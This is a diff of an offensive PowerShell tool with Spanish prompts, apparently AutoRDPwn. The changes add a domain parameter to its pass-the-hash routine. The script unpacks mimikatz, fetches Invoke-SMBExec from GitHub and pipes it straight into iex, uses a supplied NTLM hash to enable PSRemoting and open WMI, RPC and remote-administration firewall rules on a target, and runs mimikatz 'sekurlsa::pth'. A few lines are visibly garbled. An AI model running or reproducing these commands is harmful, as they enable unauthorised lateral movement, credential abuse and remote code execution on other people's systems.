@@ -12,7 +12,6 @@ $Host.PrivateData.ProgressBackgroundColor = 'Blue'
 Clear-Host
 
 function Show-Menu {
-
      Write-Host ""
      Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue ; Write-Host "         v2.8  " -ForegroundColor Yellow
      Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "_  _  _______  " -ForegroundColor Green
@@ -85,8 +84,6 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
-	
-	
 	Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
@@ -100,16 +97,18 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
         Write-Host ""
         $user = Read-Host -Prompt 'Y el usuario?'
+	Write-Host ""
+        $domain = Read-Host -Prompt 'Introduce el dominio'
         Write-Host ""
-        $ntlmpass = Read-Host -Prompt 'Introduce el hash NTLM'
+        $ntlmpass = Read-Host -Prompt 'Por último, el hash NTLM'
 	$PassTheHash = "true"
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose 2> $null
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose 2> $null
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose 2> $null
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose 2> $null }
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose 2> $null
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose 2> $null
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose 2> $null
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose 2> $null }
         
 	'3' {
         Write-Host ""
@@ -152,7 +151,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
       } until ($input -in '1','2','3','4')
 
 $Host.UI.RawUI.ForegroundColor = 'Gray'
-if(Test-Path variable:PassTheHash) { cmd /c $mimipath\mimikatz.exe privilege::debug token::elevate "sekurlsa::pth /user:$user /domain:$computer /ntlm:$ntlmpass /run:powershell" exit
+if(Test-Path variable:PassTheHash) { cmd /c $mimipath\mimikatz.exe privilege::debug token::elevate "sekurlsa::pth /user:$user /domain:$domain /ntlm:$ntlmpass /run:/run:powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" } exit
 del .\mimikatz.zip 
 del .\mimikatz\ -Force
 Write-HostWrite-Host "" }
